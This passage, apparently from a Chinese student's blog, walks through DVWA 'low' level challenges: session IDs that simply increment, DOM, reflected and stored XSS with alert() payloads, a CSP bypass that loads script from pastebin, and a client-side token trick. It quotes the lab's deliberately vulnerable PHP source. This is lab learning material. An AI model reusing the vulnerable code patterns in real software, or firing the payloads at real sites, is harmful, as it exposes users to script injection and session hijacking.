+<p><img src="https://img-blog.csdnimg.cn/20191029020021127.png" alt="数据库名首字母等于100"></p>
+<p>从而判断出数据库名的首字母为d，利用上面的二分法可以判断出数据库名为dvwa</p>
+<h2 id="3-8-Weak-Session-IDs"><a href="#3-8-Weak-Session-IDs" class="headerlink" title="3.8 Weak Session IDs"></a>3.8 Weak Session IDs</h2><h3 id="3-8-1-源码如下"><a href="#3-8-1-源码如下" class="headerlink" title="3.8.1 源码如下"></a>3.8.1 源码如下</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">$html = &quot;&quot;;</span><br><span class="line"></span><br><span class="line">if ($_SERVER[&#x27;REQUEST_METHOD&#x27;] == &quot;POST&quot;) &#123;</span><br><span class="line">    if (!isset ($_SESSION[&#x27;last_session_id&#x27;])) &#123;</span><br><span class="line">        $_SESSION[&#x27;last_session_id&#x27;] = 0;</span><br><span class="line">    &#125;</span><br><span class="line">    $_SESSION[&#x27;last_session_id&#x27;]++;</span><br><span class="line">    $cookie_value = $_SESSION[&#x27;last_session_id&#x27;];</span><br><span class="line">    setcookie(&quot;dvwaSession&quot;, $cookie_value);</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+<h3 id="3-8-2-每当点击一次Generate，dvwaSession就加1"><a href="#3-8-2-每当点击一次Generate，dvwaSession就加1" class="headerlink" title="3.8.2 每当点击一次Generate，dvwaSession就加1"></a>3.8.2 每当点击一次Generate，dvwaSession就加1</h3><p><img src="https://img-blog.csdnimg.cn/20191029020126408.png" alt="dvwaSession=18"></p>
+<p>再点击一次后，dvwaSession就变为19</p>
+<p><img src="https://img-blog.csdnimg.cn/20191029020158300.png" alt="dvwaSession=19"></p>
+<h3 id="3-8-3-如果用户-SESSION中的-last-session-id-不存在就设为-0，如果dvwaSession存在就加一，这样肯定会造成session不是唯一，引发冲突"><a href="#3-8-3-如果用户-SESSION中的-last-session-id-不存在就设为-0，如果dvwaSession存在就加一，这样肯定会造成session不是唯一，引发冲突" class="headerlink" title="3.8.3 如果用户 SESSION中的 last_session_id 不存在就设为 0，如果dvwaSession存在就加一，这样肯定会造成session不是唯一，引发冲突"></a>3.8.3 如果用户 SESSION中的 last_session_id 不存在就设为 0，如果dvwaSession存在就加一，这样肯定会造成session不是唯一，引发冲突</h3><p><img src="https://img-blog.csdnimg.cn/20191029020235148.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQxNTA5MjAw,size_16,color_FFFFFF,t_70" alt="源码"></p>
+<h2 id="3-9-XSS-DOM"><a href="#3-9-XSS-DOM" class="headerlink" title="3.9 XSS (DOM)"></a>3.9 XSS (DOM)</h2><h3 id="3-9-1-源码如下"><a href="#3-9-1-源码如下" class="headerlink" title="3.9.1 源码如下"></a>3.9.1 源码如下</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line"># No protections, anything goes</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+<h3 id="3-9-2-在url后添加下面内容后即可触发XSS攻击"><a href="#3-9-2-在url后添加下面内容后即可触发XSS攻击" class="headerlink" title="3.9.2 在url后添加下面内容后即可触发XSS攻击"></a>3.9.2 在url后添加下面内容后即可触发XSS攻击</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;alert(&#x27;XSS&#x27;);&lt;/script&gt;</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://img-blog.csdnimg.cn/201910290203452.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQxNTA5MjAw,size_16,color_FFFFFF,t_70" alt="XSS（DOM）"></p>
+<h2 id="3-10-XSS-Reflected"><a href="#3-10-XSS-Reflected" class="headerlink" title="3.10 XSS (Reflected)"></a>3.10 XSS (Reflected)</h2><h3 id="3-10-1-源码如下"><a href="#3-10-1-源码如下" class="headerlink" title="3.10.1 源码如下"></a>3.10.1 源码如下</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">header (&quot;X-XSS-Protection: 0&quot;);</span><br><span class="line"></span><br><span class="line">// Is there any input?</span><br><span class="line">if( array_key_exists( &quot;name&quot;, $_GET ) &amp;&amp; $_GET[ &#x27;name&#x27; ] != NULL ) &#123;</span><br><span class="line">    // Feedback for end user</span><br><span class="line">    echo &#x27;&lt;pre&gt;Hello &#x27; . $_GET[ &#x27;name&#x27; ] . &#x27;&lt;/pre&gt;&#x27;;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+<h3 id="3-10-2-在文本输入框中输入下面内容后即可触发XSS攻击"><a href="#3-10-2-在文本输入框中输入下面内容后即可触发XSS攻击" class="headerlink" title="3.10.2 在文本输入框中输入下面内容后即可触发XSS攻击"></a>3.10.2 在文本输入框中输入下面内容后即可触发XSS攻击</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;alert(&#x27;我攻击成功了&#x27;);&lt;/script&gt;</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://img-blog.csdnimg.cn/2019102902044241.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQxNTA5MjAw,size_16,color_FFFFFF,t_70" alt="XSS（Reflected）"></p>
+<h2 id="3-11-XSS-Stored"><a href="#3-11-XSS-Stored" class="headerlink" title="3.11 XSS (Stored)"></a>3.11 XSS (Stored)</h2><h3 id="3-11-1-源码如下"><a href="#3-11-1-源码如下" class="headerlink" title="3.11.1 源码如下"></a>3.11.1 源码如下</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">if( isset( $_POST[ &#x27;btnSign&#x27; ] ) ) &#123;</span><br><span class="line">    // Get input</span><br><span class="line">    $message = trim( $_POST[ &#x27;mtxMessage&#x27; ] );</span><br><span class="line">    $name    = trim( $_POST[ &#x27;txtName&#x27; ] );</span><br><span class="line"></span><br><span class="line">    // Sanitize message input</span><br><span class="line">    $message = stripslashes( $message );</span><br><span class="line">    $message = ((isset($GLOBALS[&quot;___mysqli_ston&quot;]) &amp;&amp; is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_real_escape_string($GLOBALS[&quot;___mysqli_ston&quot;],  $message ) : ((trigger_error(&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;, E_USER_ERROR)) ? &quot;&quot; : &quot;&quot;));</span><br><span class="line"></span><br><span class="line">    // Sanitize name input</span><br><span class="line">    $name = ((isset($GLOBALS[&quot;___mysqli_ston&quot;]) &amp;&amp; is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_real_escape_string($GLOBALS[&quot;___mysqli_ston&quot;],  $name ) : ((trigger_error(&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;, E_USER_ERROR)) ? &quot;&quot; : &quot;&quot;));</span><br><span class="line"></span><br><span class="line">    // Update database</span><br><span class="line">    $query  = &quot;INSERT INTO guestbook ( comment, name ) VALUES ( &#x27;$message&#x27;, &#x27;$name&#x27; );&quot;;</span><br><span class="line">    $result = mysqli_query($GLOBALS[&quot;___mysqli_ston&quot;],  $query ) or die( &#x27;&lt;pre&gt;&#x27; . ((is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_error($GLOBALS[&quot;___mysqli_ston&quot;]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : false)) . &#x27;&lt;/pre&gt;&#x27; );</span><br><span class="line"></span><br><span class="line">    //mysql_close();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+<h3 id="3-11-2-在文本输入框中，Name栏输入CUMT，Message栏输入下面内容可以触发攻击"><a href="#3-11-2-在文本输入框中，Name栏输入CUMT，Message栏输入下面内容可以触发攻击" class="headerlink" title="3.11.2 在文本输入框中，Name栏输入CUMT，Message栏输入下面内容可以触发攻击"></a>3.11.2 在文本输入框中，Name栏输入CUMT，Message栏输入下面内容可以触发攻击</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;alert(‘只要够认真，老师给高分’)&lt;/script&gt;</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://img-blog.csdnimg.cn/20191029020651582.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQxNTA5MjAw,size_16,color_FFFFFF,t_70" alt="XSS (Stored)"></p>
+<p>然后，我在google浏览器中点击XSS (Stored)，就会出现我在火狐浏览中已经添加的脚本的现象</p>
+<p><img src="https://img-blog.csdnimg.cn/20191029020727215.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQxNTA5MjAw,size_16,color_FFFFFF,t_70" alt="XSS (Stored)--google"></p>
+<h2 id="3-12-CSP-Bypass"><a href="#3-12-CSP-Bypass" class="headerlink" title="3.12 CSP Bypass"></a>3.12 CSP Bypass</h2><h3 id="3-12-1-源码如下"><a href="#3-12-1-源码如下" class="headerlink" title="3.12.1 源码如下"></a>3.12.1 源码如下</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">$headerCSP = &quot;Content-Security-Policy: script-src &#x27;self&#x27; https://pastebin.com  example.com code.jquery.com https://ssl.google-analytics.com ;&quot;; // allows js from self, pastebin.com, jquery and google analytics.</span><br><span class="line"></span><br><span class="line">header($headerCSP);</span><br><span class="line"></span><br><span class="line"># https://pastebin.com/raw/R570EE00</span><br><span class="line"></span><br><span class="line">?&gt;</span><br><span class="line">&lt;?php</span><br><span class="line">if (isset ($_POST[&#x27;include&#x27;])) &#123;</span><br><span class="line">$page[ &#x27;body&#x27; ] .= &quot;</span><br><span class="line">    &lt;script src=&#x27;&quot; . $_POST[&#x27;include&#x27;] . &quot;&#x27;&gt;&lt;/script&gt;</span><br><span class="line">&quot;;</span><br><span class="line">&#125;</span><br><span class="line">$page[ &#x27;body&#x27; ] .= &#x27;</span><br><span class="line">&lt;form name=&quot;csp&quot; method=&quot;POST&quot;&gt;</span><br><span class="line">    &lt;p&gt;You can include scripts from external sources, examine the Content Security Policy and enter a URL to include here:&lt;/p&gt;</span><br><span class="line">    &lt;input size=&quot;50&quot; type=&quot;text&quot; name=&quot;include&quot; value=&quot;&quot; id=&quot;include&quot; /&gt;</span><br><span class="line">    &lt;input type=&quot;submit&quot; value=&quot;Include&quot; /&gt;</span><br><span class="line">&lt;/form&gt;</span><br><span class="line">&#x27;;</span><br></pre></td></tr></table></figure>
+
+<h3 id="3-12-2-上pastebin网站上自己写一个javascript代码输入下面代码并复制链接，将其填入文本框即可实现目的"><a href="#3-12-2-上pastebin网站上自己写一个javascript代码输入下面代码并复制链接，将其填入文本框即可实现目的" class="headerlink" title="3.12.2 上pastebin网站上自己写一个javascript代码输入下面代码并复制链接，将其填入文本框即可实现目的"></a>3.12.2 上pastebin网站上自己写一个javascript代码输入下面代码并复制链接，将其填入文本框即可实现目的</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;alert(‘happy every day’)&lt;/script&gt;</span><br></pre></td></tr></table></figure>
+
+<h2 id="3-13-JavaScript"><a href="#3-13-JavaScript" class="headerlink" title="3.13 JavaScript"></a>3.13 JavaScript</h2><h3 id="3-13-1-源码如下"><a href="#3-13-1-源码如下" class="headerlink" title="3.13.1 源码如下"></a>3.13.1 源码如下</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$page[ &#x27;body&#x27; ] .= &lt;&lt;&lt;EOF</span><br><span class="line">&lt;script&gt;</span><br><span class="line"></span><br><span class="line">/*</span><br><span class="line">MD5 code from here</span><br><span class="line">https://github.com/blueimp/JavaScript-MD5</span><br><span class="line">*/</span><br><span class="line"></span><br><span class="line">!function(n)&#123;&quot;use strict&quot;;function t(n,t)&#123;var r=(65535&amp;n)+(65535&amp;t);return(n&gt;&gt;16)+(t&gt;&gt;16)+(r&gt;&gt;16)&lt;&lt;16|65535&amp;r&#125;function r(n,t)&#123;return n&lt;&lt;t|n&gt;&gt;&gt;32-t&#125;function e(n,e,o,u,c,f)&#123;return t(r(t(t(e,n),t(u,f)),c),o)&#125;function o(n,t,r,o,u,c,f)&#123;return e(t&amp;r|~t&amp;o,n,t,u,c,f)&#125;function u(n,t,r,o,u,c,f)&#123;return e(t&amp;o|r&amp;~o,n,t,u,c,f)&#125;function c(n,t,r,o,u,c,f)&#123;return e(t^r^o,n,t,u,c,f)&#125;function f(n,t,r,o,u,c,f)&#123;return e(r^(t|~o),n,t,u,c,f)&#125;function i(n,r)&#123;n[r&gt;&gt;5]|=128&lt;&lt;r%32,n[14+(r+64&gt;&gt;&gt;9&lt;&lt;4)]=r;var e,i,a,d,h,l=1732584193,g=-271733879,v=-1732584194,m=271733878;for(e=0;e&lt;n.length;e+=16)i=l,a=g,d=v,h=m,g=f(g=f(g=f(g=f(g=c(g=c(g=c(g=c(g=u(g=u(g=u(g=u(g=o(g=o(g=o(g=o(g,v=o(v,m=o(m,l=o(l,g,v,m,n[e],7,-680876936),g,v,n[e+1],12,-389564586),l,g,n[e+2],17,606105819),m,l,n[e+3],22,-1044525330),v=o(v,m=o(m,l=o(l,g,v,m,n[e+4],7,-176418897),g,v,n[e+5],12,1200080426),l,g,n[e+6],17,-1473231341),m,l,n[e+7],22,-45705983),v=o(v,m=o(m,l=o(l,g,v,m,n[e+8],7,1770035416),g,v,n[e+9],12,-1958414417),l,g,n[e+10],17,-42063),m,l,n[e+11],22,-1990404162),v=o(v,m=o(m,l=o(l,g,v,m,n[e+12],7,1804603682),g,v,n[e+13],12,-40341101),l,g,n[e+14],17,-1502002290),m,l,n[e+15],22,1236535329),v=u(v,m=u(m,l=u(l,g,v,m,n[e+1],5,-165796510),g,v,n[e+6],9,-1069501632),l,g,n[e+11],14,643717713),m,l,n[e],20,-373897302),v=u(v,m=u(m,l=u(l,g,v,m,n[e+5],5,-701558691),g,v,n[e+10],9,38016083),l,g,n[e+15],14,-660478335),m,l,n[e+4],20,-405537848),v=u(v,m=u(m,l=u(l,g,v,m,n[e+9],5,568446438),g,v,n[e+14],9,-1019803690),l,g,n[e+3],14,-187363961),m,l,n[e+8],20,1163531501),v=u(v,m=u(m,l=u(l,g,v,m,n[e+13],5,-1444681467),g,v,n[e+2],9,-51403784),l,g,n[e+7],14,1735328473),m,l,n[e+12],20,-1926607734),v=c(v,m=c(m,l=c(l,g,v,m,n[e+5],4,-378558),g,v,n[e+8],11,-2022574463),l,g,n[e+11],16,1839030562),m,l,n[e+14],23,-35309556),v=c(v,m=c(m,l=c(l,g,v,m,n[e+1],4,-1530992060),g,v,n[e+4],11,1272893353),l,g,n[e+7],16,-155497632),m,l,n[e+10],23,-1094730640),v=c(v,m=c(m,l=c(l,g,v,m,n[e+13],4,681279174),g,v,n[e],11,-358537222),l,g,n[e+3],16,-722521979),m,l,n[e+6],23,76029189),v=c(v,m=c(m,l=c(l,g,v,m,n[e+9],4,-640364487),g,v,n[e+12],11,-421815835),l,g,n[e+15],16,530742520),m,l,n[e+2],23,-995338651),v=f(v,m=f(m,l=f(l,g,v,m,n[e],6,-198630844),g,v,n[e+7],10,1126891415),l,g,n[e+14],15,-1416354905),m,l,n[e+5],21,-57434055),v=f(v,m=f(m,l=f(l,g,v,m,n[e+12],6,1700485571),g,v,n[e+3],10,-1894986606),l,g,n[e+10],15,-1051523),m,l,n[e+1],21,-2054922799),v=f(v,m=f(m,l=f(l,g,v,m,n[e+8],6,1873313359),g,v,n[e+15],10,-30611744),l,g,n[e+6],15,-1560198380),m,l,n[e+13],21,1309151649),v=f(v,m=f(m,l=f(l,g,v,m,n[e+4],6,-145523070),g,v,n[e+11],10,-1120210379),l,g,n[e+2],15,718787259),m,l,n[e+9],21,-343485551),l=t(l,i),g=t(g,a),v=t(v,d),m=t(m,h);return[l,g,v,m]&#125;function a(n)&#123;var t,r=&quot;&quot;,e=32*n.length;for(t=0;t&lt;e;t+=8)r+=String.fromCharCode(n[t&gt;&gt;5]&gt;&gt;&gt;t%32&amp;255);return r&#125;function d(n)&#123;var t,r=[];for(r[(n.length&gt;&gt;2)-1]=void 0,t=0;t&lt;r.length;t+=1)r[t]=0;var e=8*n.length;for(t=0;t&lt;e;t+=8)r[t&gt;&gt;5]|=(255&amp;n.charCodeAt(t/8))&lt;&lt;t%32;return r&#125;function h(n)&#123;return a(i(d(n),8*n.length))&#125;function l(n,t)&#123;var r,e,o=d(n),u=[],c=[];for(u[15]=c[15]=void 0,o.length&gt;16&amp;&amp;(o=i(o,8*n.length)),r=0;r&lt;16;r+=1)u[r]=909522486^o[r],c[r]=1549556828^o[r];return e=i(u.concat(d(t)),512+8*t.length),a(i(c.concat(e),640))&#125;function g(n)&#123;var t,r,e=&quot;&quot;;for(r=0;r&lt;n.length;r+=1)t=n.charCodeAt(r),e+=&quot;0123456789abcdef&quot;.charAt(t&gt;&gt;&gt;4&amp;15)+&quot;0123456789abcdef&quot;.charAt(15&amp;t);return e&#125;function v(n)&#123;return unescape(encodeURIComponent(n))&#125;function m(n)&#123;return h(v(n))&#125;function p(n)&#123;return g(m(n))&#125;function s(n,t)&#123;return l(v(n),v(t))&#125;function C(n,t)&#123;return g(s(n,t))&#125;function A(n,t,r)&#123;return t?r?s(t,n):C(t,n):r?m(n):p(n)&#125;&quot;function&quot;==typeof define&amp;&amp;define.amd?define(function()&#123;return A&#125;):&quot;object&quot;==typeof module&amp;&amp;module.exports?module.exports=A:n.md5=A&#125;(this);</span><br><span class="line"></span><br><span class="line">    function rot13(inp) &#123;</span><br><span class="line">        return inp.replace(/[a-zA-Z]/g,function(c)&#123;return String.fromCharCode((c&lt;=&quot;Z&quot;?90:122)&gt;=(c=c.charCodeAt(0)+13)?c:c-26);&#125;);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function generate_token() &#123;</span><br><span class="line">        var phrase = document.getElementById(&quot;phrase&quot;).value;</span><br><span class="line">        document.getElementById(&quot;token&quot;).value = md5(rot13(phrase));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    generate_token();</span><br><span class="line">&lt;/script&gt;</span><br><span class="line">EOF;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+<h3 id="3-13-2-按F12看源码发现了md5加密后的token"><a href="#3-13-2-按F12看源码发现了md5加密后的token" class="headerlink" title="3.13.2 按F12看源码发现了md5加密后的token"></a>3.13.2 按F12看源码发现了md5加密后的token</h3><p><img src="https://img-blog.csdnimg.cn/20191029021002348.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQxNTA5MjAw,size_16,color_FFFFFF,t_70" alt="加密后的token"></p>
+<h3 id="3-13-3-发现产生token的函数"><a href="#3-13-3-发现产生token的函数" class="headerlink" title="3.13.3 发现产生token的函数"></a>3.13.3 发现产生token的函数</h3><p><img src="https://img-blog.csdnimg.cn/20191029021051987.png" alt="产生token的函数"></p>
+<h3 id="3-13-4-在输入框输入success，在console输入generate-token-并回车"><a href="#3-13-4-在输入框输入success，在console输入generate-token-并回车" class="headerlink" title="3.13.4 在输入框输入success，在console输入generate_token()并回车"></a>3.13.4 在输入框输入success，在console输入generate_token()并回车</h3><p><img src="https://img-blog.csdnimg.cn/20191029021132160.png" alt="产生success"></p>
+<p><img src="https://img-blog.csdnimg.cn/20191029021151289.png" alt="测试成功"></p>
+<h1 id="4-总结"><a href="#4-总结" class="headerlink" title="4 总结"></a>4 总结</h1><p>经过这次搭建渗透环境并自主渗透的过程，我对Web安全有了更深的了解，下一步就要把medium、high和impossible级别的题目做一下，以加强学习。</p>
+<h1 id="5-特别致谢"><a href="#5-特别致谢" class="headerlink" title="5 特别致谢"></a>5 特别致谢</h1><p>本文在参考下面各位大佬的经验而得到的部分wp，谢谢各位朋友</p>
+<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/jojo-feed/p/10206443.html">https://www.cnblogs.com/jojo-feed/p/10206443.html</a><br><a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_45038413/article/details/90045210">https://blog.csdn.net/weixin_45038413&#x2F;article&#x2F;details&#x2F;90045210</a><br><a target="_blank" rel="noopener" href="https://www.bilibili.com/video/av66653656/?p=10">https://www.bilibili.com/video/av66653656/?p=10</a></p>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://example.com/2019/10/28/DVWA-low-wp/" data-id="cl1qb1dxq0029qktudvwo17tu" data-title="DVWA-low-wp" class="article-share-link">分享</a>
+      
+      
+      
+  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/DVWA/" rel="tag">DVWA</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Web/" rel="tag">Web</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/writeup/" rel="tag">writeup</a></li></ul>
+
+    </footer>
+  </div>
+  
+    
+<nav id="article-nav">
+  
+    <a href="/2019/10/28/DVWA-Medium-wp/" id="article-nav-newer" class="article-nav-link-wrap">
+      <strong class="article-nav-caption">前一篇</strong>
+      <div class="article-nav-title">
+        
+          DVWA-Medium-wp
+        
+      </div>
+    </a>
+  
+  
+    <a href="/2019/10/23/CUMTOJ%E7%AE%97%E6%B3%95%E4%BD%9C%E4%B8%9A%E4%B8%80/" id="article-nav-older" class="article-nav-link-wrap">
+      <strong class="article-nav-caption">后一篇</strong>
+      <div class="article-nav-title">CUMTOJ算法作业一</div>
+    </a>
+  
+</nav>
+
+  
+</article>
+
+
+</section>
+        
+          <aside id="sidebar">
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">分类</h3>
+    <div class="widget">
+      <ul class="category-list"><li class="category-list-item"><a class="category-list-link" href="/categories/Android/">Android</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/CSharp/">CSharp</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/CTF/">CTF</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/Cpp/">Cpp</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/DVWA/">DVWA</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/Java/">Java</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/JavaScript/">JavaScript</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/Linux/">Linux</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/MySQL/">MySQL</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/Web/">Web</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/python/">python</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E5%8C%BA%E5%9D%97%E9%93%BE/">区块链</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E5%AF%86%E7%A0%81%E5%AD%A6/">密码学</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/">数据结构</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E7%AE%97%E6%B3%95/">算法</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E7%BB%8F%E9%AA%8C/">经验</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/">网络安全</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/">计算机网络</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E8%AE%A1%E7%AE%97%E6%9C%BA%E8%80%83%E7%A0%94%E5%A4%8D%E8%AF%95/">计算机考研复试</a></li></ul>
+    </div>
+  </div>
+
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">标签</h3>
+    <div class="widget">
+      <ul class="tag-list" itemprop="keywords"><li class="tag-list-item"><a class="tag-list-link" href="/tags/APP-Inventor/" rel="tag">APP Inventor</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Android/" rel="tag">Android</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/C/" rel="tag">C</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/C/" rel="tag">C++</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/CSharp/" rel="tag">CSharp</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/CTF/" rel="tag">CTF</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/DVWA/" rel="tag">DVWA</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Java/" rel="tag">Java</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/JavaScript/" rel="tag">JavaScript</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Linux/" rel="tag">Linux</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Misc/" rel="tag">Misc</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/MySQL/" rel="tag">MySQL</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Reverse/" rel="tag">Reverse</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Web/" rel="tag">Web</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/python/" rel="tag">python</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/web/" rel="tag">web</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/writeup/" rel="tag">writeup</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E6%95%B0%E5%AD%A6/" rel="tag">信息安全数学</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E5%89%8D%E7%AB%AF/" rel="tag">前端</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E5%8C%BA%E5%9D%97%E9%93%BE/" rel="tag">区块链</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E5%8D%8F%E8%AE%AE/" rel="tag">协议</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E5%AF%86%E7%A0%81%E5%AD%A6/" rel="tag">密码学</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E5%BA%93%E4%B8%8E%E6%A8%A1%E5%9D%97/" rel="tag">库与模块</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E6%8B%92%E7%BB%9D%E6%9C%8D%E5%8A%A1%E6%94%BB%E5%87%BB/" rel="tag">拒绝服务攻击</a></li><li class="tag-list-item"><a class="tag-list-link" 